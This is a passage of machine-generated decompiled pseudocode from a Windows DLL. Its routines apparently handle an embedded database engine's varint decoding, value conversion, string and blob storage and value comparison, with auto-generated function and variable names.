  int v23; // edx
  int v24; // [esp+0h] [ebp-8h]
  int v25; // [esp+4h] [ebp-4h]
  int v26; // [esp+4h] [ebp-4h]

  v2 = *a1;
  if ( (v2 & 0x80u) != 0 )
  {
    v4 = a1 + 1;
    v5 = *v4;
    if ( (v5 & 0x80u) != 0 )
    {
      v6 = (char *)(v4 + 1);
      v7 = (unsigned __int8)*v6 | (v2 << 14);
      if ( *v6 < 0 )
      {
        v8 = v7 & 0x1FC07F;
        v9 = (unsigned __int8 *)(v6 + 1);
        v10 = *v9 | (v5 << 14);
        if ( (v10 & 0x80u) != 0 )
        {
          v11 = v10 & 0x1FC07F;
          v12 = (char *)(v9 + 1);
          v25 = (unsigned __int8)*v12 | (v8 << 14);
          if ( *v12 < 0 )
          {
            v13 = v11 | (v8 << 7);
            v14 = (unsigned __int8 *)(v12 + 1);
            v15 = *v14 | (v11 << 14);
            v24 = v15;
            if ( (v15 & 0x80u) != 0 )
            {
              v16 = v14 + 1;
              v17 = *v16;
              v18 = v17 | (v25 << 14);
              if ( (v17 & 0x80u) != 0 )
              {
                v26 = v18 & 0x1FC07F;
                v19 = v16 + 1;
                v20 = *v19;
                v21 = v20 | (v24 << 14);
                if ( (v20 & 0x80u) != 0 )
                {
                  v22 = v19 + 1;
                  v23 = *v22 | (((v26 << 7) | v21 & 0x1FC07F) << 8);
                  a2[1] = (16 * v13) | (*(v22 - 4) >> 3) & 0xF;
                  *a2 = v23;
                  return 9;
                }
                else
                {
                  a2[1] = v13 >> 4;
                  *a2 = (v26 << 7) | v21 & 0xF01FC07F;
                  return 8;
                }
              }
              else
              {
                *a2 = v18 ^ (v18 ^ (v24 << 7)) & 0xFE03F80;
                a2[1] = v13 >> 11;
                return 7;
              }
            }
            else
            {
              *a2 = v15 | ((v25 & 0x1FC07F) << 7);
              a2[1] = v13 >> 18;
              return 6;
            }
          }
          else
          {
            *a2 = (unsigned __int8)*v12 | (v8 << 14) | (v11 << 7);
            a2[1] = v8 >> 18;
            return 5;
          }
        }
        else
        {
          a2[1] = 0;
          *a2 = (v8 << 7) | v10 & 0x1FC07F;
          return 4;
        }
      }
      else
      {
        a2[1] = 0;
        *a2 = v7 & 0x1FC07F | ((v5 & 0x7F) << 7);
        return 3;
      }
    }
    else
    {
      a2[1] = 0;
      *a2 = v5 | ((v2 & 0x7F) << 7);
      return 2;
    }
  }
  else
  {
    a2[1] = 0;
    *a2 = v2;
    return 1;
  }
}

//----- (10059BD0) --------------------------------------------------------
char __usercall sub_10059BD0@<al>(unsigned __int8 *a1@<ecx>, int *a2@<edi>)
{
  int v2; // eax
  unsigned __int8 *v3; // ecx
  int v4; // edx
  char result; // al
  unsigned __int8 *v6; // ecx
  int v7; // eax
  int v8[2]; // [esp+0h] [ebp-8h] BYREF

  v2 = *a1;
  v3 = a1 + 1;
  v4 = *v3;
  if ( (v4 & 0x80u) != 0 )
  {
    v6 = v3 + 1;
    v7 = *v6 | (v2 << 14);
    if ( (v7 & 0x80u) != 0 )
    {
      result = sub_10059A38(v6 - 2, v8);
      if ( v8[1] )
        *a2 = -1;
      else
        *a2 = v8[0];
    }
    else
    {
      *a2 = v7 & 0x1FC07F | ((v4 & 0x7F) << 7);
      return 3;
    }
  }
  else
  {
    *a2 = v4 | ((v2 & 0x7F) << 7);
    return 2;
  }
  return result;
}

//----- (10059C32) --------------------------------------------------------
int __cdecl sub_10059C32(unsigned __int64 a1)
{
  int result; // eax
  bool v2; // zf

  result = 0;
  do
  {
    ++result;
    LODWORD(a1) = a1 >> 7;
    v2 = __PAIR64__(HIDWORD(a1) >> 7, a1) == 0;
    HIDWORD(a1) >>= 7;
  }
  while ( !v2 && result < 9 );
  return result;
}

//----- (10059C56) --------------------------------------------------------
int __usercall sub_10059C56@<eax>(_BYTE *a1@<eax>)
{
  unsigned __int16 v1; // cx

  HIBYTE(v1) = *a1;
  LOBYTE(v1) = a1[1];
  return (((unsigned __int8)a1[2] | (v1 << 8)) << 8) | (unsigned __int8)a1[3];
}

//----- (10059C70) --------------------------------------------------------
_BYTE *__usercall sub_10059C70@<eax>(_BYTE *result@<eax>, int a2@<ecx>)
{
  *result = HIBYTE(a2);
  result[1] = BYTE2(a2);
  result[2] = BYTE1(a2);
  result[3] = a2;
  return result;
}

//----- (10059C8B) --------------------------------------------------------
_DWORD *__usercall sub_10059C8B@<eax>(int a1@<ecx>, int a2@<edi>, int a3)
{
  _DWORD *result; // eax
  int v4; // esi
  char v5; // cl
  int v6; // eax
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int v8; // [esp+10h] [ebp+8h]

  result = sub_10059073(a1, a3 / 2 + 1);
  v8 = a3 - 1;
  v4 = 0;
  v7 = result;
  if ( result )
  {
    if ( v8 > 0 )
    {
      do
      {
        v5 = (16 * (*(_BYTE *)(a2 + v4) - 7 * ((*(char *)(a2 + v4) >> 6) & 1))) | (*(_BYTE *)(a2 + v4 + 1)
                                                                                 - 7
                                                                                 * ((*(char *)(a2 + v4 + 1) >> 6) & 1)) & 0xF;
        v6 = v4 / 2;
        v4 += 2;
        *((_BYTE *)v7 + v6) = v5;
      }
      while ( v4 < v8 );
    }
    result = v7;
    *((_BYTE *)v7 + v4 / 2) = 0;
  }
  return result;
}

//----- (10059D05) --------------------------------------------------------
BOOL __usercall sub_10059D05@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 56);
  return v1 == 1266094736 || v1 == -1607883113 || v1 == -264537850;
}

//----- (10059D24) --------------------------------------------------------
int __usercall sub_10059D24@<eax>(int a1@<eax>, int a2)
{
  if ( (*(_BYTE *)(a1 + 28) & 2) == 0 || *(unsigned __int8 *)(a1 + 31) == a2 )
    return 0;
  else
    return sub_10070666(a1, a2);
}

//----- (10059D49) --------------------------------------------------------
int __usercall sub_10059D49@<eax>(int a1@<eax>, int a2@<edi>, int a3)
{
  int v3; // esi
  void *v4; // eax
  _DWORD *v5; // eax
  const void *v6; // ecx
  void *v7; // eax
  void (__cdecl *v8)(_DWORD); // eax
  int v9; // eax

  v3 = a1;
  if ( a1 < 32 )
    v3 = 32;
  if ( sub_10058E55(*(_DWORD *)(a2 + 36)) < v3 )
  {
    if ( a3 && (v4 = *(void **)(a2 + 20), v4 == *(void **)(a2 + 36)) )
    {
      v5 = sub_10059167(*(_DWORD *)(a2 + 16), v4, v3);
      a3 = 0;
      *(_DWORD *)(a2 + 20) = v5;
    }
    else
    {
      sub_10058EC7(*(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 36));
      v5 = sub_10059073(*(_DWORD *)(a2 + 16), v3);
    }
    *(_DWORD *)(a2 + 36) = v5;
  }
  v6 = *(const void **)(a2 + 20);
  if ( v6 )
  {
    if ( a3 )
    {
      v7 = *(void **)(a2 + 36);
      if ( v7 )
      {
        if ( v6 != v7 )
          memcpy(v7, v6, *(_DWORD *)(a2 + 24));
      }
    }
  }
  if ( (*(_WORD *)(a2 + 28) & 0x400) != 0 )
  {
    v8 = *(void (__cdecl **)(_DWORD))(a2 + 32);
    if ( v8 )
      v8(*(_DWORD *)(a2 + 20));
  }
  v9 = *(_DWORD *)(a2 + 36);
  *(_DWORD *)(a2 + 20) = v9;
  if ( v9 )
    *(_WORD *)(a2 + 28) &= 0xE7FFu;
  else
    *(_WORD *)(a2 + 28) = 1;
  *(_DWORD *)(a2 + 32) = 0;
  return v9 != 0 ? 0 : 7;
}

//----- (10059E08) --------------------------------------------------------
int __usercall sub_10059E08@<eax>(int a1@<eax>)
{
  if ( (*(_BYTE *)(a1 + 28) & 0x12) != 0 && *(_DWORD *)(a1 + 20) != *(_DWORD *)(a1 + 36) )
  {
    if ( sub_10059D49(*(_DWORD *)(a1 + 24) + 2, a1, 1) )
      return 7;
    *(_BYTE *)(*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 24)) = 0;
    *(_BYTE *)(*(_DWORD *)(a1 + 20) + *(_DWORD *)(a1 + 24) + 1) = 0;
    *(_WORD *)(a1 + 28) |= 0x200u;
  }
  return 0;
}

//----- (10059E4E) --------------------------------------------------------
int __usercall sub_10059E4E@<eax>(int a1@<eax>)
{
  __int16 v2; // ax

  v2 = *(_WORD *)(a1 + 28);
  if ( (v2 & 0x200) == 0 && (v2 & 2) != 0 )
  {
    if ( sub_10059D49(*(_DWORD *)(a1 + 24) + 2, a1, 1) )
      return 7;
    *(_BYTE *)(*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20)) = 0;
    *(_BYTE *)(*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20) + 1) = 0;
    *(_WORD *)(a1 + 28) |= 0x200u;
  }
  return 0;
}

//----- (10059E94) --------------------------------------------------------
int __usercall sub_10059E94@<eax>(int a1@<eax>, int a2)
{
  __int16 v3; // bx
  _BYTE *v5; // eax

  v3 = *(_WORD *)(a1 + 28);
  if ( sub_10059D49(32, a1, 0) )
    return 7;
  if ( (v3 & 4) != 0 )
    sub_10055543(32, *(_DWORD *)(a1 + 20), aLld, *(_DWORD *)a1, *(_DWORD *)(a1 + 4));
  else
    sub_10055543(32, *(_DWORD *)(a1 + 20), a15g, *(double *)(a1 + 8));
  v5 = sub_10059297(*(_BYTE **)(a1 + 20));
  *(_WORD *)(a1 + 28) |= 0x202u;
  *(_DWORD *)(a1 + 24) = v5;
  *(_BYTE *)(a1 + 31) = 1;
  sub_10059D24(a1, a2);
  return 0;
}

//----- (10059F0A) --------------------------------------------------------
int __usercall sub_10059F0A@<eax>(int a1@<edi>, int a2@<esi>)
{
  int result; // eax
  int v3[16]; // [esp+0h] [ebp-40h] BYREF

  result = 0;
  if ( a1 )
  {
    if ( *(_DWORD *)(a1 + 20) )
    {
      memset(v3, 0, sizeof(v3));
      v3[6] = *(_DWORD *)(a2 + 16);
      LOWORD(v3[9]) = 1;
      v3[12] = a2;
      v3[0] = a1;
      (*(void (__cdecl **)(int *))(a1 + 20))(v3);
      sub_10058EC7(*(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 36));
      memcpy((void *)a2, &v3[2], 0x28u);
      return v3[13];
    }
  }
  return result;
}

//----- (10059F6C) --------------------------------------------------------
int *__usercall sub_10059F6C@<eax>(int *result@<eax>)
{
  int *v1; // esi
  __int16 v2; // cx

  v1 = result;
  v2 = *((_WORD *)result + 14);
  if ( (v2 & 0x2460) != 0 )
  {
    if ( (v2 & 0x2000) != 0 )
    {
      sub_10059F0A(*result, (int)result);
      return (int *)sub_10059FC7(v1);
    }
    else if ( (v2 & 0x400) != 0 && (result = (int *)result[8]) != 0 )
    {
      result = (int *)((int (__cdecl *)(int))result)(v1[5]);
      v1[8] = 0;
    }
    else if ( (v2 & 0x20) != 0 )
    {
      return sub_100724B9(*v1);
    }
    else if ( (v2 & 0x40) != 0 )
    {
      return (int *)sub_1005A1F4(v1);
    }
  }
  return result;
}
// 10059FC7: using guessed type _DWORD __cdecl sub_10059FC7(_DWORD);
// 1005A1F4: using guessed type _DWORD __cdecl sub_1005A1F4(_DWORD);

//----- (10059FC7) --------------------------------------------------------
int __cdecl sub_10059FC7(int *a1)
{
  int result; // eax

  sub_10059F6C(a1);
  sub_10058EC7(a1[4], a1[9]);
  result = 0;
  a1[5] = 0;
  a1[9] = 0;
  a1[8] = 0;
  return result;
}

//----- (10059FF6) --------------------------------------------------------
int __cdecl sub_10059FF6(double a1)
{
  __int64 v1; // rax

  if ( (double)(__int64)0x8000000000000000ui64 > a1 || (double)0x7FFFFFFFFFFFFFFFi64 < a1 )
    LODWORD(v1) = 0;
  else
    return (unsigned __int64)a1;
  return v1;
}

//----- (1005A03A) --------------------------------------------------------
int __usercall sub_1005A03A@<eax>(int a1@<esi>)
{
  __int16 v1; // ax
  int v3; // [esp+8h] [ebp-8h] BYREF

  v1 = *(_WORD *)(a1 + 28);
  if ( (v1 & 4) != 0 )
    return *(_DWORD *)a1;
  if ( (v1 & 8) != 0 )
    return sub_10059FF6(*(double *)(a1 + 8));
  if ( (v1 & 0x12) == 0 )
    return 0;
  *(_WORD *)(a1 + 28) = v1 | 2;
  if ( sub_10059D24(a1, 1) || sub_10059E4E(a1) )
    return 0;
  sub_100597DB(*(char **)(a1 + 20), &v3);
  return v3;
}

//----- (1005A0AF) --------------------------------------------------------
double __usercall sub_1005A0AF@<st0>(int a1@<esi>)
{
  __int16 v1; // ax
  double result; // st7
  double v3; // [esp+0h] [ebp-8h] BYREF

  v1 = *(_WORD *)(a1 + 28);
  if ( (v1 & 8) != 0 )
    return *(double *)(a1 + 8);
  if ( (v1 & 4) != 0 )
    return (double)*(__int64 *)a1;
  result = 0.0;
  if ( (v1 & 0x12) != 0 )
  {
    v3 = 0.0;
    *(_WORD *)(a1 + 28) = v1 | 2;
    if ( sub_10059D24(a1, 1) || sub_10059E4E(a1) )
    {
      return 0.0;
    }
    else
    {
      sub_100594F4(*(_BYTE **)(a1 + 20), &v3);
      return v3;
    }
  }
  return result;
}

//----- (1005A108) --------------------------------------------------------
void __usercall sub_1005A108(int a1@<esi>)
{
  int v1; // eax
  int v2; // edx
  unsigned int v3; // ecx

  v1 = sub_10059FF6(*(double *)(a1 + 8));
  *(_DWORD *)(a1 + 4) = v2;
  v3 = *(_DWORD *)(a1 + 4);
  *(_DWORD *)a1 = v1;
  if ( (double)__SPAIR64__(v3, v1) == *(double *)(a1 + 8) && (v3 != 0x80000000 || v1) && (v3 != 0x7FFFFFFF || v1 != -1) )
    *(_WORD *)(a1 + 28) |= 4u;
}
// 1005A11B: variable 'v2' is possibly undefined

//----- (1005A15D) --------------------------------------------------------
int __usercall sub_1005A15D@<eax>(int a1@<eax>)
{
  int v2; // edx

  *(_DWORD *)a1 = sub_1005A03A(a1);
  *(_WORD *)(a1 + 28) = *(_WORD *)(a1 + 28) & 0xFF00 | 4;
  *(_DWORD *)(a1 + 4) = v2;
  return 0;
}
// 1005A177: variable 'v2' is possibly undefined

//----- (1005A17E) --------------------------------------------------------
int __usercall sub_1005A17E@<eax>(int a1@<eax>)
{
  *(double *)(a1 + 8) = sub_1005A0AF(a1);
  *(_WORD *)(a1 + 28) = *(_WORD *)(a1 + 28) & 0xFF00 | 8;
  return 0;
}

//----- (1005A19D) --------------------------------------------------------
int __usercall sub_1005A19D@<eax>(int a1@<eax>)
{
  __int64 v2; // rax
  __int16 v3; // ax
  double v5; // [esp+18h] [ebp-8h]

  v5 = sub_1005A0AF(a1);
  LODWORD(v2) = sub_10059FF6(v5);
  if ( (double)v2 == v5 )
  {
    sub_1005A15D(a1);
  }
  else
  {
    v3 = *(_WORD *)(a1 + 28) & 0xFF08;
    *(double *)(a1 + 8) = v5;
    *(_WORD *)(a1 + 28) = v3 | 8;
  }
  return 0;
}
// 1005A1C1: variable 'v2' is possibly undefined

//----- (1005A1F4) --------------------------------------------------------
__int16 __cdecl sub_1005A1F4(int a1)
{
  __int16 result; // ax

  if ( (*(_BYTE *)(a1 + 28) & 0x40) != 0 )
    sub_1005B17B(*(int **)a1);
  if ( (*(_BYTE *)(a1 + 28) & 0x20) != 0 )
    sub_100724B9(*(_DWORD *)a1);
  result = *(_WORD *)(a1 + 28) & 0xFF00 | 1;
  *(_WORD *)(a1 + 28) = result;
  *(_BYTE *)(a1 + 30) = 5;
  return result;
}

//----- (1005A280) --------------------------------------------------------
int __usercall sub_1005A280@<eax>(int a1@<esi>, int a2, int a3)
{
  int result; // eax
  int *v4; // [esp+0h] [ebp-4h]

  sub_10059FC7(v4);
  *(_DWORD *)a1 = a2;
  result = a3;
  *(_DWORD *)(a1 + 4) = a3;
  *(_WORD *)(a1 + 28) = 4;
  *(_BYTE *)(a1 + 30) = 1;
  return result;
}
// 1005A284: variable 'v4' is possibly undefined

//----- (1005A2A1) --------------------------------------------------------
__int16 __usercall sub_1005A2A1@<ax>(int a1@<esi>, double a2)
{
  __int16 result; // ax

  if ( sub_1005926E() )
    return sub_1005A1F4(a1);
  result = sub_10059FC7((int *)a1);
  *(double *)(a1 + 8) = a2;
  *(_WORD *)(a1 + 28) = 8;
  *(_BYTE *)(a1 + 30) = 2;
  return result;
}

//----- (1005A2D8) --------------------------------------------------------
_DWORD *__usercall sub_1005A2D8@<eax>(int a1@<edi>)
{
  int v1; // esi
  _DWORD *result; // eax
  int v3; // eax
  int v4; // ecx
  int *v5; // [esp+0h] [ebp-10h]

  v1 = *(_DWORD *)(a1 + 16);
  sub_10059FC7(v5);
  result = sub_10059073(v1, 64);
  *(_DWORD *)(a1 + 36) = result;
  if ( *(_BYTE *)(v1 + 30) )
  {
    *(_WORD *)(a1 + 28) = 1;
  }
  else
  {
    v3 = sub_10058E55((unsigned int)result);
    v4 = *(_DWORD *)(a1 + 36);
    result = (_DWORD *)((unsigned int)(v3 - 32) >> 4);
    *(_DWORD *)v4 = 0;
    *(_DWORD *)(v4 + 4) = v1;
    *(_DWORD *)(v4 + 8) = 0;
    *(_DWORD *)(v4 + 12) = 0;
    *(_DWORD *)(v4 + 20) = 0;
    *(_DWORD *)(v4 + 16) = v4 + 32;
    *(_WORD *)(v4 + 24) = (_WORD)result;
    *(_BYTE *)(v4 + 26) = 1;
    *(_BYTE *)(v4 + 27) = 0;
    *(_DWORD *)a1 = v4;
    *(_WORD *)(a1 + 28) = 32;
  }
  return result;
}
// 1005A2DF: variable 'v5' is possibly undefined

//----- (1005A33C) --------------------------------------------------------
BOOL __usercall sub_1005A33C@<eax>(int a1@<eax>)
{
  return (*(_BYTE *)(a1 + 28) & 0x12) != 0 && *(_DWORD *)(a1 + 24) > *(_DWORD *)(*(_DWORD *)(a1 + 16) + 72);
}

//----- (1005A356) --------------------------------------------------------
__int16 __usercall sub_1005A356@<ax>(int a1@<edi>, int a2@<esi>, __int16 a3)
{
  int v3; // eax

  sub_10059F6C((int *)a2);
  memcpy((void *)a2, (const void *)a1, 0x24u);
  *(_DWORD *)(a2 + 32) = 0;
  if ( (*(_WORD *)(a1 + 28) & 0x400) != 0 || (v3 = *(_DWORD *)(a1 + 20), v3 == *(_DWORD *)(a1 + 36)) )
  {
    LOWORD(v3) = a3 | *(_WORD *)(a2 + 28) & 0xE3FF;
    *(_WORD *)(a2 + 28) = v3;
  }
  return v3;
}

//----- (1005A394) --------------------------------------------------------
int __usercall sub_1005A394@<eax>(_WORD *a1@<ebx>, int a2@<esi>)
{
  int v2; // edi
  __int16 v3; // ax

  v2 = 0;
  sub_10059F6C((int *)a2);
  memcpy((void *)a2, a1, 0x24u);
  *(_WORD *)(a2 + 28) &= ~0x400u;
  v3 = *(_WORD *)(a2 + 28);
  if ( (v3 & 0x12) != 0 && (a1[14] & 0x800) == 0 )
  {
    *(_WORD *)(a2 + 28) = v3 | 0x1000;
    return sub_10059E08(a2);
  }
  return v2;
}

//----- (1005A3D5) --------------------------------------------------------
void *__usercall sub_1005A3D5@<eax>(int a1@<esi>, int *a2)
{
  void *result; // eax

  sub_10059FC7(a2);
  result = memcpy(a2, (const void *)a1, 0x28u);
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_WORD *)(a1 + 28) = 1;
  return result;
}

//----- (1005A3FE) --------------------------------------------------------
int __usercall sub_1005A3FE@<eax>(
        void (__cdecl *a1)(int a1, unsigned int a2)@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        _BYTE *Src,
        char a5)
{
  int v5; // ebx
  int v8; // eax
  int v9; // eax
  char v11; // al
  int v13; // [esp+Ch] [ebp-Ch]
  size_t Size; // [esp+10h] [ebp-8h]
  __int16 v15; // [esp+14h] [ebp-4h]

  v5 = a3;
  if ( Src )
  {
    v8 = *(_DWORD *)(a2 + 16);
    if ( v8 )
    {
      v9 = *(_DWORD *)(v8 + 72);
      v13 = v9;
    }
    else
    {
      v13 = 1000000000;
      v9 = 1000000000;
    }
    v15 = a5 != 0 ? 2 : 16;
    if ( a3 < 0 )
    {
      v5 = 0;
      if ( a5 == 1 )
      {
        if ( v9 >= 0 )
        {
          do
          {
            if ( !Src[v5] )
              break;
            ++v5;
          }
          while ( v5 <= v9 );
        }
      }
      else if ( v9 >= 0 )
      {
        do
        {
          if ( !*(_WORD *)&Src[v5] )
            break;
          v5 += 2;
        }
        while ( v5 <= v9 );
      }
      v15 |= 0x200u;
    }
    if ( a1 == (void (__cdecl *)(int, unsigned int))-1 )
    {
      Size = v5;
      if ( (v15 & 0x200) != 0 )
        Size = v5 + (a5 != 1) + 1;
      if ( v5 > v9 )
        return 18;
      if ( sub_10059D49(Size, a2, 0) )
        return 7;
      memcpy(*(void **)(a2 + 20), Src, Size);
    }
    else
    {
      sub_10059FC7((int *)a2);
      *(_DWORD *)(a2 + 20) = Src;
      if ( a1 == sub_10058EC7 )
      {
        *(_DWORD *)(a2 + 32) = 0;
        *(_DWORD *)(a2 + 36) = Src;
      }
      else
      {
        *(_DWORD *)(a2 + 32) = a1;
        v15 |= a1 != 0 ? 1024 : 2048;
      }
    }
    *(_DWORD *)(a2 + 24) = v5;
    *(_WORD *)(a2 + 28) = v15;
    if ( a5 )
      v11 = a5;
    else
      v11 = 1;
    *(_BYTE *)(a2 + 31) = v11;
    *(_BYTE *)(a2 + 30) = (a5 == 0) + 3;
    if ( v11 == 1 || !sub_10070A34(a2) )
    {
      if ( v5 <= v13 )
        return 0;
      return 18;
    }
    return 7;
  }
  sub_1005A1F4(a2);
  return 0;
}

//----- (1005A556) --------------------------------------------------------
int __usercall sub_1005A556@<eax>(int a1@<eax>, int a2@<ebx>, int a3)
{
  __int16 v4; // ax
  __int16 v5; // dx
  char v6; // cl
  int result; // eax
  double v8; // st7
  double v9; // st6
  unsigned int v10; // eax
  unsigned int v11; // ecx
  signed int v12; // edi
  signed int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // eax
  int v17; // esi
  signed int v18; // eax
  int v19[10]; // [esp+Ch] [ebp-50h] BYREF
  int v20[10]; // [esp+34h] [ebp-28h] BYREF

  v4 = *(_WORD *)(a3 + 28);
  v5 = *(_WORD *)(a1 + 28);
  v6 = v5 | v4;
  if ( (((unsigned __int8)v5 | (unsigned __int8)v4) & 1) != 0 )
    return (v4 & 1) - (v5 & 1);
  if ( (v6 & 0xC) != 0 )
  {
    if ( (v5 & 0xC) == 0 )
      return 1;
    if ( (v4 & 0xC) == 0 )
      return -1;
    if ( ((unsigned __int8)v5 & (unsigned __int8)v4 & 4) != 0 )
    {
      v10 = *(_DWORD *)a1;
      v11 = *(_DWORD *)a3;
      v12 = *(_DWORD *)(a1 + 4);
      v13 = *(_DWORD *)(a3 + 4);
      if ( v12 > v13 )
        return 1;
      if ( v12 >= v13 && v10 >= v11 )
        return __SPAIR64__(v12, v10) > __SPAIR64__(v13, v11);
    }
    else
    {
      if ( (v5 & 8) != 0 )
        v8 = *(double *)(a1 + 8);
      else
        v8 = (double)*(__int64 *)a1;
      if ( (v4 & 8) != 0 )
        v9 = *(double *)(a3 + 8);
      else
        v9 = (double)*(__int64 *)a3;
      if ( v9 <= v8 )
        return v9 < v8;
    }
    return -1;
  }
  if ( (v6 & 2) == 0 )
    goto LABEL_30;
  if ( (v5 & 2) == 0 )
    return 1;
  if ( (v4 & 2) == 0 )
    return -1;
  if ( a2 )
  {
    if ( *(_BYTE *)(a1 + 31) == *(_BYTE *)(a2 + 4) )
    {
      return (*(int (__cdecl **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(a2 + 12))(
               *(_DWORD *)(a2 + 8),
               *(_DWORD *)(a1 + 24),
               *(_DWORD *)(a1 + 20),
               *(_DWORD *)(a3 + 24),
               *(_DWORD *)(a3 + 20));
    }
    else
    {
      memset(v19, 0, sizeof(v19));
      memset(v20, 0, sizeof(v20));
      sub_1005A356(a1, (int)v19, 4096);
      sub_1005A356(a3, (int)v20, 4096);
      v14 = sub_1005A7DD((int)v19, *(_BYTE *)(a2 + 4));
      v15 = v14 != 0 ? v19[6] : 0;
      v16 = sub_1005A7DD((int)v20, *(_BYTE *)(a2 + 4));
      v17 = (*(int (__cdecl **)(_DWORD, int, int, int, int))(a2 + 12))(
              *(_DWORD *)(a2 + 8),
              v15,
              v14,
              v16 != 0 ? v20[6] : 0,
              v16);
      sub_10059FC7(v19);
      sub_10059FC7(v20);
      return v17;
    }
  }
  else
  {
LABEL_30:
    v18 = *(_DWORD *)(a1 + 24);
    if ( v18 > *(_DWORD *)(a3 + 24) )
      v18 = *(_DWORD *)(a3 + 24);
    result = memcmp(*(const void **)(a1 + 20), *(const void **)(a3 + 20), v18);
    if ( !result )
      return *(_DWORD *)(a1 + 24) - *(_DWORD *)(a3 + 24);
  }
  return result;
}

//----- (1005A70D) --------------------------------------------------------
int __usercall sub_1005A70D@<eax>(int a1@<eax>, int a2@<ecx>, size_t a3@<ebx>, int a4, int a5)
{
  int v6; // eax
  int v8; // eax
  int result; // eax
  char *v10; // [esp-4h] [ebp-1Ch]
  int v11; // [esp+Ch] [ebp-Ch]
  int v12; // [esp+10h] [ebp-8h] BYREF
  int v13; // [esp+14h] [ebp-4h]

  v6 = 0;
  v12 = 0;
  v13 = 0;
  if ( a5 )
  {
    if ( *(_BYTE *)(a2 + 67) == 1 )
      v6 = sub_100637A4(a2, &v12, 0);
  }
  else if ( *(_BYTE *)(a2 + 67) == 1 )
  {
    v6 = sub_100637A4(a2, &v12, 1);
  }
  v11 = v6;
  if ( (int)(a3 + a4) > v12 || (*(_WORD *)(a1 + 28) & 0x400) != 0 )
  {
    v13 = sub_10059D49(a3 + 2, a1, 0);
    if ( !v13 )
    {
      v10 = *(char **)(a1 + 20);
      *(_WORD *)(a1 + 28) = 1552;
      *(_BYTE *)(a1 + 31) = 0;
      *(_BYTE *)(a1 + 30) = 4;
      if ( a5 )
        v8 = sub_100635F1(a4, a2, a3, v10);
      else
        v8 = sub_10063776(a2, a4, a3, v10);
      v13 = v8;
      *(_BYTE *)(a3 + *(_DWORD *)(a1 + 20)) = 0;
      *(_BYTE *)(*(_DWORD *)(a1 + 20) + a3 + 1) = 0;
      if ( v8 )
        sub_10059FC7((int *)a1);
    }
  }
  else
  {
    sub_10059FC7((int *)a1);
    *(_DWORD *)(a1 + 20) = a4 + v11;
    *(_WORD *)(a1 + 28) = 4112;
  }
  result = v13;
  *(_DWORD *)(a1 + 24) = a3;
  return result;
}

//----- (1005A7DD) --------------------------------------------------------
int __cdecl sub_1005A7DD(int a1, unsigned __int8 a2)
{
  __int16 v2; // cx

  if ( !a1 )
    return 0;
  v2 = *(_WORD *)(a1 + 28);
  if ( (v2 & 1) != 0 )
    return 0;
  *(_WORD *)(a1 + 28) = v2 | ((unsigned __int8)v2 >> 3) & 2;
  if ( v2 & 2 | ((unsigned __int8)v2 >> 3) & 2 )
  {
    sub_10059D24(a1, a2 & 0xF7);
    if ( (a2 & 8) != 0 && (*(_BYTE *)(a1 + 20) & 1) == 1 && sub_10059E08(a1) )
      return 0;
    sub_10059E4E(a1);
  }
  else
  {
    sub_10059E94(a1, a2);
  }
  if ( *(unsigned __int8 *)(a1 + 31) == (a2 & 0xF7) )
    return *(_DWORD *)(a1 + 20);
  return 0;
}

//----- (1005A85A) --------------------------------------------------------
_DWORD *__usercall sub_1005A85A@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax

  result = sub_1005904B(a1, 0x28u);
  if ( result )
  {
    *((_WORD *)result + 14) = 1;
    *((_BYTE *)result + 30) = 5;
    result[4] = a1;
  }
  return result;
}

//----- (1005A876) --------------------------------------------------------
int __cdecl sub_1005A876(int a1, unsigned __int8 *a2, int a3, int a4, _DWORD *a5)
{
  int v5; // ebx
  int v6; // edx
  bool v7; // cf
  int v8; // esi
  _BYTE *v9; // eax
  int v10; // ebx
  int v11; // ecx
  _BYTE *v12; // eax
  _BYTE *v13; // eax
  unsigned int v15; // [esp+10h] [ebp-Ch]
  int *v16; // [esp+14h] [ebp-8h] BYREF

  v15 = 0;
  v16 = 0;
  if ( a2 )
  {
    v5 = *a2;
    if ( v5 == 132 )
      v5 = a2[35];
    switch ( v5 )
    {
      case 94:
      case 130:
      case 129:
        v8 = a1;
        v16 = sub_1005A85A(a1);
        if ( v16 )
        {
          if ( (*((_WORD *)a2 + 1) & 0x400) != 0 )
          {
            sub_1005A280((int)v16, *((_DWORD *)a2 + 1), *((int *)a2 + 1) >> 31);
          }
          else
          {
            v13 = sub_10059194(*((_BYTE **)a2 + 1));
            v15 = (unsigned int)v13;
            if ( !v13 )
              break;
            sub_1005A3FE(sub_10058EC7, (int)v16, -1, v13, 1);
            if ( v5 == 130 )
              *((_BYTE *)v16 + 30) = 2;
          }
          if ( (v5 == 129 || v5 == 130) && (_BYTE)a4 == 98 )
            sub_1005C806((int)v16, 99, 1u);
          else
            sub_1005C806((int)v16, a4, 1u);
          if ( (_BYTE)a3 != 1 )
            sub_10059D24((int)v16, (unsigned __int8)a3);
          goto LABEL_28;
        }
        break;
      case 156:
        if ( !sub_1005A876(a1, *((_DWORD *)a2 + 2), a3, a4, &v16) )
        {
          v6 = v16[1];
          v7 = *v16 != 0;
          *v16 = -*v16;
          v16[1] = -(v7 + v6);
          *((double *)v16 + 1) = *((double *)v16 + 1) * -1.0;
        }
        goto LABEL_28;
      case 131:
        v8 = a1;
        v16 = sub_1005A85A(a1);
        if ( v16 )
        {
          v9 = sub_10059297((_BYTE *)(*((_DWORD *)a2 + 1) + 2));
          v10 = (int)(v9 - 1) / 2;
          v12 = sub_10059C8B(a1, v11, (int)(v9 - 1));
          sub_1005A3FE(sub_10058EC7, (int)v16, v10, v12, 0);
LABEL_28:
          if ( v16 )
            sub_1005C69B((int)v16);
          goto LABEL_30;
        }
        break;
      default:
LABEL_30:
        *a5 = v16;
        return 0;
    }
    *(_BYTE *)(v8 + 30) = 1;
    sub_10058EC7(v8, v15);
    sub_1005AA4D(v16);
    *a5 = 0;
